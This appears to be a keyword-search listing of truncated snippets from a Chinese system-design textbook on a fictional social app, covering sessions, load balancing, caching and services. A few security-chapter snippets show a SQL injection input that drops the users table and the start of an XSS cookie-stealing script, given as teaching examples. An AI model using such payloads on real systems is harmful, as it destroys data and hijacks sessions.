  c19_b06.md: ...：       SELECT * FROM users WHERE username = ''; DROP TABLE users; --'   这删除了整个 users 表。所有用户数据丢失。  SQL 注入之所以有效，是因为应用通过字符串拼接构建...
  c19_b06.md: ...M users WHERE username = ''; DROP TABLE users; --'   这删除了整个 users 表。所有用户数据丢失。  SQL 注入之所以有效，是因为应用通过字符串拼接构建 SQL 查询，把用户输入当作 SQL...
  c19_b06.md: ...es）**（也称 prepared statements）：       query = "SELECT * FROM users WHERE username = ?"     db.execute(query, [user_input])   在...
  c27_b03.md: ...15–24 个月）  **它是什么：** 添加 PostgreSQL 读取副本（最初两个）以卸载读查询。随着写负载增长，users 表被分片——SocialSnap 数据首次跨多个数据库分割。  **关键决策：**  * 读取副本用于 feed、pr...

=== server (82 occurrences) ===
  c06_b04.md: ...范围扫描非常快。  对服务器监控用例：       Row key: server_id + date (e.g., "server-001:2024-01-15")     Columns: timestamps → metric values...
  c06_b04.md: ...pu: 43, mem: 71, disk_io: 11, ...}   某台服务器某天的所有指标连续存储。查询“给我 server-001 在 2024-01-15 09:00 到 10:00 之间的所有指标”就是单行范围扫描——极快。   ####...
  c07_b03.md: ...同一个程序里的变量。  **代价：** 缓存不跨应用服务器实例共享。如果你运行 10 个应用服务器，每个维护自己的缓存。server 1 未命中，对 server 2 可能是命中——实例间不一致。此外，重启后缓存丢失。   #### 分布式缓存（进程外...
  c07_b03.md: ...价：** 缓存不跨应用服务器实例共享。如果你运行 10 个应用服务器，每个维护自己的缓存。server 1 未命中，对 server 2 可能是命中——实例间不一致。此外，重启后缓存丢失。   #### 分布式缓存（进程外）  **分布式缓存** 是一...
  c09_b01.md: ...作  假设 SocialSnap 运行 5 台应用服务器。哪个服务器应该处理 incoming 请求？答案不能是“总是 server 1”——server 1 会被压垮，而 servers 2–5 闲置。你需要一个组件，智能地把请求分发给可用服务器。...
  c09_b01.md: ...lSnap 运行 5 台应用服务器。哪个服务器应该处理 incoming 请求？答案不能是“总是 server 1”——server 1 会被压垮，而 servers 2–5 闲置。你需要一个组件，智能地把请求分发给可用服务器。  这个组件就是**负载...
  c11_b02.md: ...### 11.2 根本原因——有状态的应用服务器  Alice 登录。轮询负载均衡器把她的登录请求路由到 Server A。Server A 在本地 `sessions` 字典中创建会话记录并设置 cookie。Alice 的浏览器现在有...
  c11_b02.md: ...# 11.2 根本原因——有状态的应用服务器  Alice 登录。轮询负载均衡器把她的登录请求路由到 Server A。Server A 在本地 `sessions` 字典中创建会话记录并设置 cookie。Alice 的浏览器现在有了会话 cooki...
  c11_b02.md: ...ookie。Alice 的浏览器现在有了会话 cookie。  Alice 点击“我的资料”。负载均衡器把该请求路由到 Server B（轮询序列中的下一个）。Server B 收到带 cookie `sess_a7b3c9d2e4f1` 的请求。Se...
  c11_b02.md: ...会话 cookie。  Alice 点击“我的资料”。负载均衡器把该请求路由到 Server B（轮询序列中的下一个）。Server B 收到带 cookie `sess_a7b3c9d2e4f1` 的请求。Server B 在**它自己的** `se...
  c11_b02.md: ...er B（轮询序列中的下一个）。Server B 收到带 cookie `sess_a7b3c9d2e4f1` 的请求。Server B 在**它自己的** `sessions` 字典中查找 `sess_a7b3c9d2e4f1`。  这个 key 不...
  c11_b02.md: ...**它自己的** `sessions` 字典中查找 `sess_a7b3c9d2e4f1`。  这个 key 不在那里。Server B 没有处理登录——Server A 处理的。会话只存在于 Server A 的内存中。  Server B 认为这是...
  c11_b02.md: ...s` 字典中查找 `sess_a7b3c9d2e4f1`。  这个 key 不在那里。Server B 没有处理登录——Server A 处理的。会话只存在于 Server A 的内存中。  Server B 认为这是未认证请求，返回错误或重定向到登录...
  c11_b02.md: ...9d2e4f1`。  这个 key 不在那里。Server B 没有处理登录——Server A 处理的。会话只存在于 Server A 的内存中。  Server B 认为这是未认证请求，返回错误或重定向到登录页。  Alice 实际上因为点击“我的...
  c11_b02.md: ...y 不在那里。Server B 没有处理登录——Server A 处理的。会话只存在于 Server A 的内存中。  Server B 认为这是未认证请求，返回错误或重定向到登录页。  Alice 实际上因为点击“我的资料”而被登出。  这就是有状态...
  c11_b03.md: ...# 方案 1：粘性会话（错误）  最简单的修复：配置负载均衡器，让同一用户总是路由到同一台服务器。Alice 的会话在 Server A 创建后，她后续所有请求都路由到 Server A。问题解决了吗？  并不完全。  **IP 哈希问题：** 基于...
  c11_b03.md: ...置负载均衡器，让同一用户总是路由到同一台服务器。Alice 的会话在 Server A 创建后，她后续所有请求都路由到 Server A。问题解决了吗？  并不完全。  **IP 哈希问题：** 基于 IP 哈希的粘性按客户端 IP 路由。但很多用户共...
  c11_b03.md: ...大公司的所有员工可能显示为同一个 IP 地址——他们全都会被路由到同一台后端服务器。  **服务器故障问题：** 如果 Server A 宕机，Alice 的所有会话都丢失了。她（以及所有会话在 Server A 上的其他用户）必须重新登录。粘性会话把...
  c11_b03.md: ...服务器。  **服务器故障问题：** 如果 Server A 宕机，Alice 的所有会话都丢失了。她（以及所有会话在 Server A 上的其他用户）必须重新登录。粘性会话把服务器故障变成强制登出。  **扩展问题：** 如果 Server A 积累...
  c11_b03.md: ...有会话在 Server A 上的其他用户）必须重新登录。粘性会话把服务器故障变成强制登出。  **扩展问题：** 如果 Server A 积累了很多活动会话（重度用户），它比 Server B 或 C 得到更多流量——分布不均。负载均衡器失去了平衡负载...
  c11_b03.md: ...粘性会话把服务器故障变成强制登出。  **扩展问题：** 如果 Server A 积累了很多活动会话（重度用户），它比 Server B 或 C 得到更多流量——分布不均。负载均衡器失去了平衡负载的能力。  **部署问题：** 如果你需要重启 Serv...
  c11_b03.md: ...rver B 或 C 得到更多流量——分布不均。负载均衡器失去了平衡负载的能力。  **部署问题：** 如果你需要重启 Server A（部署新代码），所有粘着 Server A 的用户都会被登出或经历中断。零停机部署变得困难得多。  粘性会话解决了症...
  c11_b03.md: ...不均。负载均衡器失去了平衡负载的能力。  **部署问题：** 如果你需要重启 Server A（部署新代码），所有粘着 Server A 的用户都会被登出或经历中断。零停机部署变得困难得多。  粘性会话解决了症状（请求到达知道它们的会话），却保留了根本...
  c11_b03.md: ...### 方案 2：服务器间共享会话（脆弱）  另一种方案：使用分布式共享文件系统或数据库，三台服务器都把会话数据写进去。Server A 把 Alice 的会话写到共享存储；Server B 和 C 可以读取。  原则上可行。实践中，这正是在重新发明分...
  c11_b03.md: ...案：使用分布式共享文件系统或数据库，三台服务器都把会话数据写进去。Server A 把 Alice 的会话写到共享存储；Server B 和 C 可以读取。  原则上可行。实践中，这正是在重新发明分布式会话存储——而方案 3（正确答案）就提供这个。用...
  c11_b04.md: ...red or invalid         return json.loads(data)   现在 Alice 在 Server A 登录时，会话存在 Redis 中——Server B 和 C 都能访问。Alice 的下一个请求到 Server...
  c11_b04.md: ...rn json.loads(data)   现在 Alice 在 Server A 登录时，会话存在 Redis 中——Server B 和 C 都能访问。Alice 的下一个请求到 Server B 时，Server B 在 Redis 中找到会话。...
  c11_b04.md: ...Server A 登录时，会话存在 Redis 中——Server B 和 C 都能访问。Alice 的下一个请求到 Server B 时，Server B 在 Redis 中找到会话。Alice 保持登录。应用服务器现在是无状态的——它自己内存里不...
  c11_b04.md: ...录时，会话存在 Redis 中——Server B 和 C 都能访问。Alice 的下一个请求到 Server B 时，Server B 在 Redis 中找到会话。Alice 保持登录。应用服务器现在是无状态的——它自己内存里不保存任何每个会话的数据...
  c11_b05.md: ...──┬──────────┐     │ App      │ App      │ App      │     │ Server A │ Server B │ Server C │     └──────────┴──────────┴──────...
  c11_b05.md: ...──┐     │ App      │ App      │ App      │     │ Server A │ Server B │ Server C │     └──────────┴──────────┴──────────┘...
  c11_b05.md: ...pp      │ App      │ App      │     │ Server A │ Server B │ Server C │     └──────────┴──────────┴──────────┘         ↓...
  c11_b05.md: ...数据挤出去——会话对驱逐比缓存条目更敏感。  每台应用服务器现在相同且可互换。负载均衡器可以把任何请求路由到任何服务器。Server A 因代码部署重启时，负载均衡器通过健康检查把它标记为不健康，把流量路由到 Server B 和 C，等它恢复后再标记...
  c11_b05.md: ...以把任何请求路由到任何服务器。Server A 因代码部署重启时，负载均衡器通过健康检查把它标记为不健康，把流量路由到 Server B 和 C，等它恢复后再标记为健康。对用户零影响。   #### 扩展到三台以上  有了无状态应用服务器，扩展就像配置...
  c11_b08.md: ...可防止两个请求都读到 `0`、各加 1、再都写回 `1`（结果应为 `2` 却成了 `1`）。  **多台服务器：** Server A 读到 `like_count = 100`。Server B 也读到 `like_count = 100`。Ser...
  c11_b08.md: ...应为 `2` 却成了 `1`）。  **多台服务器：** Server A 读到 `like_count = 100`。Server B 也读到 `like_count = 100`。Server A 写回 `like_count = 101`。Ser...
  c11_b08.md: ...ver A 读到 `like_count = 100`。Server B 也读到 `like_count = 100`。Server A 写回 `like_count = 101`。Server B 也写回 `like_count = 101`。正确答...
  c11_b08.md: ...ver B 也读到 `like_count = 100`。Server A 写回 `like_count = 101`。Server B 也写回 `like_count = 101`。正确答案是 102。这是**竞态条件（race condition）...
  c11_b09.md: ...的状态类型：  **内存缓存：** 如果应用服务器维护自己的内存缓存（不是 Redis），不同服务器有不同缓存内容。到 Server A 的请求看到缓存值；同一请求到 Server B 缓存未命中并访问数据库。这既造成不一致（两个用户看到不同数据），也...
  c11_b09.md: ...器维护自己的内存缓存（不是 Redis），不同服务器有不同缓存内容。到 Server A 的请求看到缓存值；同一请求到 Server B 缓存未命中并访问数据库。这既造成不一致（两个用户看到不同数据），也造成负载不均。  **本地文件系统状态：** 如...
  c11_b09.md: ...地文件系统状态：** 如果应用生成文件并存在本地（临时报告、生成缩略图、缓存模板），这些文件在其他服务器上不存在。下载 Server A 生成文件的请求若路由到 Server B 会失败。  **WebSocket 连接状态：** 如果应用服务器把 W...
  c11_b09.md: ...在本地（临时报告、生成缩略图、缓存模板），这些文件在其他服务器上不存在。下载 Server A 生成文件的请求若路由到 Server B 会失败。  **WebSocket 连接状态：** 如果应用服务器把 WebSocket 连接存在本地内存（第 9...
  c11_b11.md: ...强制会话终止，并阻止真正的负载均衡。  如果应用服务器有状态，跨服务器分发请求就会产生不匹配：Alice 的会话状态在 Server A，但她的请求可能到 Server B，而 Server B 没有她的状态。系统要么 (a) 把 Alice 的所有请...
  c11_b11.md: ...如果应用服务器有状态，跨服务器分发请求就会产生不匹配：Alice 的会话状态在 Server A，但她的请求可能到 Server B，而 Server B 没有她的状态。系统要么 (a) 把 Alice 的所有请求都路由到 Server A——消除...
  c11_b11.md: ...态，跨服务器分发请求就会产生不匹配：Alice 的会话状态在 Server A，但她的请求可能到 Server B，而 Server B 没有她的状态。系统要么 (a) 把 Alice 的所有请求都路由到 Server A——消除负载均衡的收益；要么...
  c11_b11.md: ...请求可能到 Server B，而 Server B 没有她的状态。系统要么 (a) 把 Alice 的所有请求都路由到 Server A——消除负载均衡的收益；要么 (b) 接受错误行为（Alice 随机被登出）——显然错误。  无状态服务器彻底消除问...
  c11_b11.md: ...**根本原因：** 会话数据存在每台应用服务器的内存字典（本地 Python dict）中。Alice 登录时，请求到 Server A，它在 Server A 的本地内存中创建了她的会话。但 Alice 的后续请求被轮询负载均衡器分到 Server...
  c11_b11.md: ...数据存在每台应用服务器的内存字典（本地 Python dict）中。Alice 登录时，请求到 Server A，它在 Server A 的本地内存中创建了她的会话。但 Alice 的后续请求被轮询负载均衡器分到 Server B 或 C，它们检查自己...
  c11_b11.md: ...Server A，它在 Server A 的本地内存中创建了她的会话。但 Alice 的后续请求被轮询负载均衡器分到 Server B 或 C，它们检查自己的本地会话字典——其中没有 Alice 的会话。Server B 没找到 Alice cook...
  c11_b11.md: ...的后续请求被轮询负载均衡器分到 Server B 或 C，它们检查自己的本地会话字典——其中没有 Alice 的会话。Server B 没找到 Alice cookie 对应的会话，把她当作未认证。  **修复：** 把会话存储从应用服务器本地内存移...
  c11_b11.md: ...存储从应用服务器本地内存移到共享外部 Redis 实例。三台应用服务器都从同一个 Redis 读写会话。Alice 在 Server A 登录时，会话存在 Redis 中。她的下一个请求到 Server B 时，Server B 查询 Redis，找到...
  c11_b11.md: ...都从同一个 Redis 读写会话。Alice 在 Server A 登录时，会话存在 Redis 中。她的下一个请求到 Server B 时，Server B 查询 Redis，找到会话，认证 Alice。应用服务器现在无状态——不保存任何每个会话的数...
  c11_b11.md: ...读写会话。Alice 在 Server A 登录时，会话存在 Redis 中。她的下一个请求到 Server B 时，Server B 查询 Redis，找到会话，认证 Alice。应用服务器现在无状态——不保存任何每个会话的数据。  **Q3.**...
  c11_b13.md: ...* 一位 SocialSnap 工程师提议用“粘性会话”解决会话问题——配置负载均衡器让把用户 42 的请求始终路由到 Server A，用户 7 到 Server B，等等。路由基于 IP 哈希。分析这个提案：它是否解决眼前问题？它引入了哪三种具体故...
  c11_b13.md: ...工程师提议用“粘性会话”解决会话问题——配置负载均衡器让把用户 42 的请求始终路由到 Server A，用户 7 到 Server B，等等。路由基于 IP 哈希。分析这个提案：它是否解决眼前问题？它引入了哪三种具体故障模式或运维问题？  提示  想...
  c11_b13.md: ...，等等。路由基于 IP 哈希。分析这个提案：它是否解决眼前问题？它引入了哪三种具体故障模式或运维问题？  提示  想想 Server A 宕机时发生什么。想想需要重启 Server A 部署代码时发生什么。想想很多用户共享同一个 IP 地址时（比如公司...
  c11_b13.md: ...否解决眼前问题？它引入了哪三种具体故障模式或运维问题？  提示  想想 Server A 宕机时发生什么。想想需要重启 Server A 部署代码时发生什么。想想很多用户共享同一个 IP 地址时（比如公司 NAT 后）。  **答案：** 粘性会话确实...
  c11_b13.md: ...的同一台服务器，所以她保持登录。但该方案表面，并引入严重问题：  **故障模式 1：服务器故障导致强制登出。** 如果 Server A 宕机，所有“粘”在 Server A 上的用户在负载均衡器把流量故障转移到 Server B 时都会登出。Serv...
  c11_b13.md: ...案表面，并引入严重问题：  **故障模式 1：服务器故障导致强制登出。** 如果 Server A 宕机，所有“粘”在 Server A 上的用户在负载均衡器把流量故障转移到 Server B 时都会登出。Server B 不知道他们的会话。这把基础设...
  c11_b13.md: ...导致强制登出。** 如果 Server A 宕机，所有“粘”在 Server A 上的用户在负载均衡器把流量故障转移到 Server B 时都会登出。Server B 不知道他们的会话。这把基础设施故障（服务器崩溃）变成用户可见的认证故障——Serve...
  c11_b13.md: ...rver A 宕机，所有“粘”在 Server A 上的用户在负载均衡器把流量故障转移到 Server B 时都会登出。Server B 不知道他们的会话。这把基础设施故障（服务器崩溃）变成用户可见的认证故障——Server A 上每个用户崩溃后都必须...
  c11_b13.md: ...erver B 时都会登出。Server B 不知道他们的会话。这把基础设施故障（服务器崩溃）变成用户可见的认证故障——Server A 上每个用户崩溃后都必须重新登录。用外部会话存储（Redis）时，服务器崩溃不会丢失会话。  **故障模式 2：负载...
  c11_b13.md: ...AT 网关后）。如果一家大公司使用 SocialSnap，1000（1000）名员工都显示为同一 IP，他们全被路由到 Server A。Server A 负载达到 300%；Server B 和 C 基本空闲。负载均衡器理论上“平衡”了，实际上严重不...
  c11_b13.md: ...果一家大公司使用 SocialSnap，1000（1000）名员工都显示为同一 IP，他们全被路由到 Server A。Server A 负载达到 300%；Server B 和 C 基本空闲。负载均衡器理论上“平衡”了，实际上严重不均。  **故障模...
  c11_b13.md: ...，1000（1000）名员工都显示为同一 IP，他们全被路由到 Server A。Server A 负载达到 300%；Server B 和 C 基本空闲。负载均衡器理论上“平衡”了，实际上严重不均。  **故障模式 3：零停机部署变得不可能。** 要...
  c11_b13.md: ...和 C 基本空闲。负载均衡器理论上“平衡”了，实际上严重不均。  **故障模式 3：零停机部署变得不可能。** 要给 Server A 部署新代码，必须排空它的流量（停止向它路由新请求），等进行中的请求完成，再部署、重启。粘性会话下，“排空 Serv...
  c11_b13.md: ...rver A 部署新代码，必须排空它的流量（停止向它路由新请求），等进行中的请求完成，再部署、重启。粘性会话下，“排空 Server A 的流量”意味着中断当前在 Server A 上的所有活跃用户——他们要么在排空期间出错，要么丢失会话。滚动部署（逐...
  c11_b13.md: ...停止向它路由新请求），等进行中的请求完成，再部署、重启。粘性会话下，“排空 Server A 的流量”意味着中断当前在 Server A 上的所有活跃用户——他们要么在排空期间出错，要么丢失会话。滚动部署（逐台重启不停机）要求用户能安全地在服务器间移动...
  c11_b14.md: ...提示  想想“local_cache”在三台服务器中意味着什么。如果 Alice 在 Server A 更新资料，失效需要到达哪些缓存？  **答案：** 问题：`local_cache` 是每个应用服务器实例本地的进...
  c11_b14.md: ...的状态（缓存的资料数据）。  **bug 类别：缓存失效不一致。** 当 Alice 更新资料时：  1. 更新请求由 Server A 处理。 2. Server A 把新资料写入 PostgreSQL。 3. Server A 从**它自己的**...
  c11_b14.md: ...*bug 类别：缓存失效不一致。** 当 Alice 更新资料时：  1. 更新请求由 Server A 处理。 2. Server A 把新资料写入 PostgreSQL。 3. Server A 从**它自己的** `local_cache` 中删...
  c11_b14.md: ...时：  1. 更新请求由 Server A 处理。 2. Server A 把新资料写入 PostgreSQL。 3. Server A 从**它自己的** `local_cache` 中删除 `user:42:profile`。 4. Server...
  c11_b14.md: ...Server A 从**它自己的** `local_cache` 中删除 `user:42:profile`。 4. Server B 和 Server C 仍缓存着旧资料。  在接下来的 5 分钟（缓存 TTL）内，任何路由到 Server B 或...
  c11_b14.md: ...**它自己的** `local_cache` 中删除 `user:42:profile`。 4. Server B 和 Server C 仍缓存着旧资料。  在接下来的 5 分钟（缓存 TTL）内，任何路由到 Server B 或 C 的 Alice...
  c11_b14.md: ...4. Server B 和 Server C 仍缓存着旧资料。  在接下来的 5 分钟（缓存 TTL）内，任何路由到 Server B 或 C 的 Alice 资料请求都返回旧资料。Alice 在当前浏览器会话（由 Server A 服务）中看到更新...
  c11_b14.md: ...url, expires_at}`。在三台服务器部署中，这个本地缓存造成什么问题，应如何修复？  提示  想想当用户在 Server A 更新照片后预签名 URL 被重新生成时，哪些服务器拿到更新后的 URL，哪些仍服务旧 URL？  **答案：**...
  c11_b14.md: ...内存中缓存预签名 URL 会造成与 Q2 资料缓存相同的不一致问题——但还有一个额外问题：预签名 URL 会过期。如果 Server A 重新生成了新 URL（因为旧的过期或用户上传了新照片），只有 Server A 的本地缓存有新 URL。Serve...
  c11_b14.md: ...额外问题：预签名 URL 会过期。如果 Server A 重新生成了新 URL（因为旧的过期或用户上传了新照片），只有 Server A 的本地缓存有新 URL。Server B 和 C 仍服务旧 URL，而旧 URL 可能已过期或指向旧照片。  更新...
  c11_b14.md: ...erver A 重新生成了新 URL（因为旧的过期或用户上传了新照片），只有 Server A 的本地缓存有新 URL。Server B 和 C 仍服务旧 URL，而旧 URL 可能已过期或指向旧照片。  更新自己资料照片的用户在请求命中 Server...
  c11_b14.md: ...Server B 和 C 仍服务旧 URL，而旧 URL 可能已过期或指向旧照片。  更新自己资料照片的用户在请求命中 Server A 时看到新照片，但她的朋友（由 Server B 服务）看到旧照片——或者一个破碎图像（如果旧预签名 URL 已过期...
  c21_b03.md: ...事件都新建 HTTP 连接的延迟太高。对于不频繁的事件（每客户端每分钟少于一次）或容忍一定延迟的场景，HTTP 轮询或 Server-Sent Events（一种比 WebSocket 更简单的单向推送机制）可能更合适。WebSocket 有真实成本：...
  c21_b03.md: ...nection_server_id` 映射。用户连到 WebSocket 服务器时，服务器写入：`SET user:B:server S3`。消息服务要给 B 投递时读取该注册表。用户断开时，连接服务器删除该条目。  该注册表是中央协调机制。它必须快速...

=== post (81 occurrences) ===
  c05_b01.md: ...| "Hello world from Bob" | 2024-01-21 | | 103 | 1 | "Second post!" | 2024-01-22 |  注意 posts 表里的 `user_id` 列。Post 101 的 `user...
  c05_b01.md: ...1 | "Second post!" | 2024-01-22 |  注意 posts 表里的 `user_id` 列。Post 101 的 `user_id = 1`，指向 users 表中的 Alice。这就是**外键（foreign key）...
  c05_b01.md: ...| "Hello world from Bob" | 2024-01-21 | | 103 | 1 | "Second post!" | 2024-01-22 |  注意 posts 表里的 `user_id` 列。Post 101 的 `user...
  c05_b01.md: ...1 | "Second post!" | 2024-01-22 |  注意 posts 表里的 `user_id` 列。Post 101 的 `user_id = 1`，指向 users 表中的 Alice。这就是**外键（foreign key）...
  c05_b02.md: ...BY posts.created_at DESC;  这条查询：  1. 从 `posts` 取所有行 2. 把每个 post join 到 `users` 中匹配的行（`user_id` 等于 `id`） 3. 过滤出 Alice 的帖子 4....
  c06_b03.md: ...123xyz"     GET user:1:session_token → "abc123xyz"      SET post:101:like_count 14322     INCR post:101:like_count → 14323...
  c06_b03.md: ...n → "abc123xyz"      SET post:101:like_count 14322     INCR post:101:like_count → 14323   这就是 Redis。操作是亚毫秒级，因为 Redis 把整个数据集放...
  c08_b12.md: ...”通知吗？  **答案：**  **事件 schema：**       {       "event_type": "post.liked",       "event_id": "evt_a7f2b9c1",       "timestamp"...
  c08_b12.md: ...当 Alice 点赞帖子时，服务器：  1. 在 `likes` 表中插入一行（含 `like_id`） 2. 发布 `post.liked` 事件到消息队列 3. 向 Alice 的客户端返回 HTTP 200  **消费者：** 通知服务，读取...
  c08_b12.md: ...iked` 事件到消息队列 3. 向 Alice 的客户端返回 HTTP 200  **消费者：** 通知服务，读取 `post.liked` 事件并：  1. 为 Bob（`user_id=7`）创建通知记录 2. 如果 Bob 在线，推送通知计...
  c08_b12.md: ...模式，是生产安全的幂等消息处理方法。  **Q2.**（联系第 7 章陈旧性讨论）SocialSnap 工程团队争论：“post liked”通知消费者更新 Redis 计数器（`user:{user_id}:notification_count`...
  c08_b14.md: ...动作相关窗口的事件。  **架构修复——事件过期元数据：**       {       "event_type": "post.liked",       "event_id": "evt_abc123",       "timestamp":...
  c09_b08.md: ...GET  /users/42                   → fetch user 42     POST /users                      → create a new user     PUT  /u...
  c09_b08.md: ...te of user 42     DELETE /users/42/posts/101       → delete post 101 by user 42   响应通常是 JSON。REST 是无状态的：每个请求包含处理它所需的全部信息。  *...
  c09_b08.md: ...复杂（需要 schema、每个字段的 resolver） * 缓存更难——因为查询是带自定义 query body 的 POST 请求，HTTP 层缓存不适用；缓存必须在应用层做 * 过于灵活的查询可能成为安全问题（客户端可构造深嵌套查询，产生巨大...
  c09_b08.md: ...GET  /users/42                   → fetch user 42     POST /users                      → create a new user     PUT  /u...
  c09_b08.md: ...te of user 42     DELETE /users/42/posts/101       → delete post 101 by user 42   响应通常是 JSON。REST 是无状态的：每个请求包含处理它所需的全部信息。  *...
  c09_b08.md: ...复杂（需要 schema、每个字段的 resolver） * 缓存更难——因为查询是带自定义 query body 的 POST 请求，HTTP 层缓存不适用；缓存必须在应用层做 * 过于灵活的查询可能成为安全问题（客户端可构造深嵌套查询，产生巨大...
  c09_b14.md: ...feed` 可在 CDN 或浏览器层缓存（HTTP 层缓存）。GraphQL 查询是带自定义 query body 的 POST 请求，HTTP 缓存不适用。缓存必须在应用层处理——要么在 GraphQL 客户端（如 Apollo Client 的...
  c09_b15.md: ...+ 次写入。这是键值存储（第 6 章 6.3 节）的合适工作负载。  **API 设计：**  两个端点：       POST /api/presence/heartbeat       → 需要认证。刷新 presence:{user_id}...
  c09_b15.md: ...ocket 基础设施，而不是新增 HTTP 端点。  如果客户端没有 WebSocket，每 30 秒发一次 HTTP POST 也完全可接受。  **为 feed 渲染查询在线状态：**  渲染 feed 头像时，客户端可以批量查询所有可见用户的...
  c09_b15.md: ...应说明：事件流、推送到浏览器的协议，以及与限流系统的交互。  提示  从第 8 章追踪 like 事件。消息队列发布 `post.liked` 事件。某个消费者需要把通知送到 Alice 的浏览器。什么协议支持服务器推送？如果有 100,000 个...
  c12_b11.md: ...用户名存在两个地方：users 表和每条 post 行。  **答案：** 伪代码：       1. UPDATE users SET username = 'new_...
  c17_b06.md: ...2. Auth Service——验证 JWT token 3. Feed Service——决定展示哪些帖子 4. Post Service——为每个 post ID 拉取帖子内容 5. User Service——为每个帖子拉取作者资料  每...
  c17_b06.md: ...验证 JWT token 3. Feed Service——决定展示哪些帖子 4. Post Service——为每个 post ID 拉取帖子内容 5. User Service——为每个帖子拉取作者资料  每个服务都有自己的日志。如果请求慢，你...
  c17_b06.md: ...dis: get cached_feed (25ms) → MISS           [52ms - 200ms] Post Service: fetch_posts (148ms)             [55ms - 80ms]  Dat...
  c17_b06.md: ...hed_feed (33ms)   这一条追踪讲述了指标无法讲述的故事：总请求耗时 245ms，大部分（148ms）在 Post Service，其中大部分（102ms）等待 User Service 的数据库查询。feed 缓存未命中。知道这些，...
  c17_b06.md: ...2. Auth Service——验证 JWT token 3. Feed Service——决定展示哪些帖子 4. Post Service——为每个 post ID 拉取帖子内容 5. User Service——为每个帖子拉取作者资料  每...
  c17_b06.md: ...验证 JWT token 3. Feed Service——决定展示哪些帖子 4. Post Service——为每个 post ID 拉取帖子内容 5. User Service——为每个帖子拉取作者资料  每个服务都有自己的日志。如果请求慢，你...
  c17_b06.md: ...dis: get cached_feed (25ms) → MISS           [52ms - 200ms] Post Service: fetch_posts (148ms)             [55ms - 80ms]  Dat...
  c17_b06.md: ...hed_feed (33ms)   这一条追踪讲述了指标无法讲述的故事：总请求耗时 245ms，大部分（148ms）在 Post Service，其中大部分（102ms）等待 User Service 的数据库查询。feed 缓存未命中。知道这些，...
  c18_b03.md: ...流量模式**——如果生产流量读写比 80:20，负载测试应匹配。 3. **测试特定场景**——“模拟一条 viral post 导致 1000 个同时请求同一 feed 页面”测试第 7 章的惊群问题。 4. **跑到稳态（steady stat...
  c18_b04.md: ...个数据库副本：** 流量是否自动路由到主库？耗时多久？过渡期间用户体验如何？ * **向 Feed Service 到 Post Service 的调用引入 500ms 延迟：** Feed Service 的超时配置能否优雅处理？是否触发熔断器？...
  c18_b05.md: ...先在安全环境学习架构是否真的如设计那样容忍失败。 3. **定义爆炸半径**——每个实验应有明确范围：“我们将终止一个 Post Service 实例，同时其他服务正常运行。”避免可能级联成完全 outage 的实验。 4. **准备停止按钮**—...
  c18_b12.md: ...。 * 暂不更改应用代码。  **阶段 2——后端部署，功能开关关闭（第 1 周）：**  * 部署新 API 端点 `POST /posts/{id}/reactions`——代码存在，但在功能开关打开前返回 404。 * 部署 Feed Ser...
  c18_b12.md: ...阶段 4——金丝雀（第 2 周）：**  * 对 5% 用户启用功能开关。 * 监控：reaction API 错误率、Post Service 延迟（`reaction_count` join 是否增加开销？）、数据库写吞吐（`reactions...
  c19_b06.md: ...alSnap 允许用户写帖子。一个幼稚实现直接存储帖子内容并作为 HTML 渲染：       <div class="post">{{ post.content }}</div>   如果用户发布 `<script>document.cookie...
  c19_b06.md: ...用户写帖子。一个幼稚实现直接存储帖子内容并作为 HTML 渲染：       <div class="post">{{ post.content }}</div>   如果用户发布 `<script>document.cookie = docume...
  c19_b15.md: ...，不适合显示号码。  3. **访问控制：** 只有 Auth Service 能解密手机号。Feed Service、Post Service 和其他服务没有手机号解密密钥。需要显示后 4 位的支持工具通过 Auth Service API 访问...
  c20_b10.md: ...的平台）想增加短链功能。用户发帖时，SocialSnap 自动创建短版本。工程团队争论把它做成独立微服务还是集成到现有 Post Service。用本章设计证据论证两种方案，然后做决定。  提示  回想第 13 章的服务边界启发式：当不同扩展要求、...
  c20_b10.md: ...示  回想第 13 章的服务边界启发式：当不同扩展要求、不同部署节奏或不同运营特征时，服务应分离。考虑 URL 短链与 Post Service 是否共享这些属性。  **答案：**  **支持独立微服务的论点：**  * 不同扩展画像：URL 短...
  c20_b10.md: ...这些属性。  **答案：**  **支持独立微服务的论点：**  * 不同扩展画像：URL 短链读多写少（100:1），Post Service 写多（发帖内容）。独立服务可独立扩展——短链服务获得更多读服务器和更大缓存，Post Service...
  c20_b10.md: ...少（100:1），Post Service 写多（发帖内容）。独立服务可独立扩展——短链服务获得更多读服务器和更大缓存，Post Service 获得写优化基础设施。 * 不同数据存储：URL 短链数据库主要是追加（URL 创建后很少修改），而帖子...
  c20_b10.md: ...据库主要是追加（URL 创建后很少修改），而帖子频繁更新（点赞、评论、编辑）。 * 可复用：独立 URL 短链服务可被 Post Service、DM 功能（第 21 章）、通知服务和第三方开发者通过 API 使用。 * 不同 SLO：重定向延迟（...
  c20_b10.md: ...方开发者通过 API 使用。 * 不同 SLO：重定向延迟（p99 100ms）与帖子获取要求不同。  **支持集成到 Post Service 的论点：**  * 更少网络跳数：创建包含链接的帖子需要同步调用 URL 短链服务。如果短链服务宕机（...
  c20_b10.md: ...alSnap 当前阶段每天不会收到 1 亿个链接创建——独立扩展的好处可能不值得其复杂度。  **决策：** 先集成到 Post Service（使用模块/库，而非直接放在请求处理器），以快速交付功能。当 (a) 扩展要求显著分化，或 (b) 其他...
  c21_b17.md: ...（`{type: "shared_post", post_id: 12345}`）的消息。渲染该消息时，DM 客户端从 Post Service API 拉取帖子以显示。DM 数据库只存帖子 ID 引用——不存帖子内容。这维护了单一所有权原则：帖子...
  c21_b17.md: ...vice API 拉取帖子以显示。DM 数据库只存帖子 ID 引用——不存帖子内容。这维护了单一所有权原则：帖子内容由 Post Service 拥有，DM 服务只持有其引用。  集成约束：事件必须设计为向后兼容（第 18 章的 expand-co...
  c22_b06.md: ...#### 帖子创建流程  1. **用户 U 创建帖子 P：** U 的客户端向 API gateway 发送 `POST /posts`。Post Service 把 P 写入帖子数据库：`INSERT INTO posts (post_i...
  c22_b06.md: ...程  1. **用户 U 创建帖子 P：** U 的客户端向 API gateway 发送 `POST /posts`。Post Service 把 P 写入帖子数据库：`INSERT INTO posts (post_id, author_id,...
  c22_b06.md: ...created_at) VALUES (...)`。这是事实来源。 2. **触发 Fanout Service：** Post Service 向 Kafka 发布事件：`{event: "post_created", post_id: P, a...
  c22_b07.md: ...e 帖子 ID 和名人帖子合并成约 220 个候选集合。 5. **获取帖子详情：** 对候选集合中每个帖子 ID，从 Post Service 获取帖子内容。先走缓存（第 7 章 cache-aside）：大多数帖子在 Redis 中有 24 小...
